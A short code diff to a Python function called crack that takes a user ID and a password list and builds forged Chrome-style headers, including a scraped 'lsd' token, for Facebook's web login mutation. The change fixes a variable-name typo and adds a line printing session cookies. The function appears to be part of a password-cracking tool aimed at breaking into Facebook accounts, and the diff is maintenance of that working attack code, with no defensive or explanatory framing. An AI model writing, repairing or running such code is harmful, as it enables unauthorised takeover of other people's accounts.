@@ -146,7 +146,7 @@ def crack(uid, password_list, total_count):
             'sec-ch-ua-mobile': '?0',
             'viewport-width': '980',
             'x-fb-friendly-name': 'useCDSWebLoginMutation',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(respons.text)).group(1),
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),
             'x-asbd-id': '359341',
             'dpr': '2.75',
             'sec-ch-ua-full-version-list': '".Not/A)Brand";v="99.0.0.0", "Google Chrome";v="103.0.5060.129", "Chromium";v="103.0.5060.129"',
@@ -158,6 +158,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'referer': 'https://www.facebook.com/?_rdr',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
+            print("Cookies:", cookie_str)
             data = {
     'av': '0',
     'user': '0',
